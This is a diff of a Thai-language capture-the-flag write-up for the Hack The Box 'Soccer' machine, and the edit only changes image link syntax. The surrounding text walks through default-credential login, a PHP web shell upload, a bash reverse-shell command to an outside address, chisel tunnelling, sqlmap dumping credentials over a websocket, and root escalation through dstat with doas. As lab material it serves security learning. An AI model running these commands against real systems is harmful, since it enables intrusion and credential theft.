@@ -120,20 +120,20 @@ Nmap done: 1 IP address (1 host up) scanned in 17.50 seconds
 feroxbuster -u http://soccer.htb
 ```
 จากภาพด้านล่างจะเห็นว่ามี /tiny และ /tiny/uploads 
-![[Challenge/HTB Challenge/Soccer/IMG/001.png]]
+![](./IMG/001.png)
 
-![[Challenge/HTB Challenge/Soccer/IMG/002.png]]
+![](./IMG/002.png)
 
 หากเราตรวจสอบถึงโปรแกรมจะเห็นว่าเป็นโปรแกรม filemanager https://github.com/prasathmani/tinyfilemanager 
-![[Challenge/HTB Challenge/Soccer/IMG/003.png]]
+![](./IMG/003.png)
 
 ## Mis configuration
 
 ตรวจสอบ default credential ของโปรแกรมดังกล่าวจะเห็นว่ามีการใช้ admin:admin@123
-![[Challenge/HTB Challenge/Soccer/IMG/004.png]]
+![](./IMG/004.png)
 
 เมื่อนำข้อมูลดังกล่าวมาทดสอบ ปรากฎว่าสามารถเข้าได้ ด้วยสิทธิ admin 
-![[Challenge/HTB Challenge/Soccer/IMG/005.png]]
+![](./IMG/005.png)
 
 จากนั้นเราจะทำการทดสอบ upload php shell ไปยังเป้าหมาย
 
@@ -143,7 +143,7 @@ feroxbuster -u http://soccer.htb
 
 จากนั้น upload ไปที่ path /tiny/uploads  
 
-![[Challenge/HTB Challenge/Soccer/IMG/006.png]]
+![](./IMG/006.png)
 
 จากนั้นทดสอบเรียกใช้ shell ได้ดังต่อไปนี้ 
 ```bash
@@ -156,31 +156,31 @@ curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'
 curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"'
 ```
 
-![[Challenge/HTB Challenge/Soccer/IMG/007.png]]
+![](./IMG/007.png)
 
 จากการ enum จะเห็นว่ามี พอร์ต 3000 ที่เปิดใช้งานสำหรับ nginx อยู่ 
 
-![[Challenge/HTB Challenge/Soccer/IMG/008.png]]
+![](./IMG/008.png)
 
 ## Local port forwarding using chisel 
 ```bash
 chisel server -p 8000 --reverse
 ./chisel_linx64 client 10.10.14.34:8000 R:3000:127.0.0.1:3000
 ```
-![[Challenge/HTB Challenge/Soccer/IMG/009.png]]
+![](./IMG/009.png)
 
 จากนั้นทดสอบสมัครสมาชิกแล้วเข้ามาด้านในเว็บไซต์ 
 
-![[Challenge/HTB Challenge/Soccer/IMG/010.png]]
+![](./IMG/010.png)
 
 ## Web-socket
 หากตรวจสอบจะพบว่ามีการ request โดยใช้ web-socket ไปที่ soc-player.soccer.htb:9091 
-![[Challenge/HTB Challenge/Soccer/IMG/011.png]]
+![](./IMG/011.png)
 มีการใช้งาน Websockets 
 
-![[Challenge/HTB Challenge/Soccer/IMG/012.png]]
-![[Challenge/HTB Challenge/Soccer/IMG/013.png]]
-![[Challenge/HTB Challenge/Soccer/IMG/014.png]]
+![](./IMG/012.png)
+![](./IMG/013.png)
+![](./IMG/014.png)
 ทดสอบส่ง sql statement ปรากฎว่าระบบตอบมาว่า Ticket 
 
 ## Blind injection 
@@ -189,14 +189,14 @@ chisel server -p 8000 --reverse
 ==Ticket Doesn't Exists = false== 
 ==Ticket Exists = true==
 
-![[Challenge/HTB Challenge/Soccer/IMG/016.png]]
+![](./IMG/016.png)
 
 
 หากทดสอบด้วยวิธีการทำ Union จะพบว่ามีข้อมูลอยู่ 3 ส่วนที่สำเร็จ 
 ```sql
 0 UNION SELECT 1,2,3;
 ```
-![[Challenge/HTB Challenge/Soccer/IMG/017.png]]
+![](./IMG/017.png)
 
 ซึ่งหาเรา Manual Test เราจะต้องเดาเป็นจำนวนมาก 
 
@@ -216,7 +216,7 @@ sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{"id": "
 sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10 ...
 ```
 ผลลัพธ์ทำให้เราเป็นถึงข้อมูล user:password 
-![[Challenge/HTB Challenge/Soccer/IMG/018.png]]
+![](./IMG/018.png)
 
 ```bash
 player@player.htb:PlayerOftheMatch2022
@@ -266,7 +266,7 @@ player@soccer:/$
 จากข้อมูลด้านบนจะพบว่ามี doas ที่สามารถรันด้วยสิทธิ Root ได้ ไปที่โปรแกรม dstat ได้ 
 # Priv es 
 
-![[Challenge/HTB Challenge/Soccer/IMG/019.png]]
+![](./IMG/019.png)
 
 
 ```bash
@@ -275,6 +275,6 @@ echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_ice
 doas /usr/bin/dstat --ice
 ```
 
-![[Challenge/HTB Challenge/Soccer/IMG/020.png]]
+![](./IMG/020.png)
 
 # PWNED
